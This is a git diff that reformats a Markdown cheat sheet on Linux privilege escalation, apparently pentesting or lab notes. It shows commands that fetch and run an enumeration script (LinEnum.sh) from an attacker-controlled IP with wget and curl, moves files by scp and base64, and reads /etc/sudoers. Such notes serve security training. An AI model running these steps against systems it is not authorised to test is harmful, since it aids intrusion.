@@ -41,54 +41,40 @@ We can run commands inserted inside commands that we have permission for, e.g.:
 ---
 
 ## Transferring files (wget, curl & scp)
-**SCP:**
-  * on our machine, in the directory where we have the file, we open a server:
 
-    * `python3 -m http.server 8000`
+  * **WGET & cURL:**
+    * on our machine, in the directory where we have the file, we open a server:
+
+      * `python3 -m http.server 8000`
     * now on the target machine we can use either WGET or CURL:
-      * `wget http://10.10.14.199:8080/LinEnum.sh`
-      * `curl http://10.10.14.199:8080/LinEnum.sh -o LinEnum.sh`
+        * `wget http://10.10.14.199:8080/LinEnum.sh`
+        * `curl http://10.10.14.199:8080/LinEnum.sh -o LinEnum.sh`
     * Now just `chmod +x LinEnum.sh` and run it.
-
-  ---
 
   * **SCP:**
 
-    * WHEN we know an SSH login of some user
-    * we open the python server on our machine:
-
+    * When we know an SSH login of some user
+    * Open the python server on our machine:
       * `python3 -m http.server 8000`
     * now on the target machine:
-
       * `scp linenum.sh user@remotehost:/tmp/linenum.sh`
 
-  ---
-
   * **BASE64**
-
     * Useful to transfer small files and when there is a firewall blocking transfers.
     * First on our machine we encode the file:
-
       * `base64 linenum.sh -w 0`
-
         * `-w 0` → removes line breaks (+ easier to copy/paste)
     * Now we copy the output, and on the target machine:
-
       * `echo 'IyEvYmluL3NoCmlmIFtbIC1... <SNIP> ...kNlcnQgdmVyc2lvbiBvZg==' | base64 -d > linenum.sh`
     * After that, we just need to make the file executable to run it:
-
       * `chmod +x linenum.sh`
     * To check that it worked and the file is the same, we can run to check if the hash result is the same on both machines:
-
       * `md5sum shell`
 
 ---
 
-[https://github.com/MattiaCossu/PE-Linux?tab=readme-ov-file#org15d85a8](https://github.com/MattiaCossu/PE-Linux?tab=readme-ov-file#org15d85a8)
-
----
-
-* **Manual enumeration / Information Gathering**
+# **1. Manual enumeration / Information Gathering**
+Check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`)
 
   **System (host / kernel / arch)**
 
@@ -236,23 +222,14 @@ We can run commands inserted inside commands that we have permission for, e.g.:
 
 ---
 
-1. CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`)
-
----
-
-* 2. **SUDO**
-
+# 2. **SUDO**
   * List commands we can run with sudo.
-
     ```bash
     sudo -l
     ```
-
     ```bash
     cat /etc/sudoers
     ```
-
-  ---
 
   **Ex → tcpdump:**
 
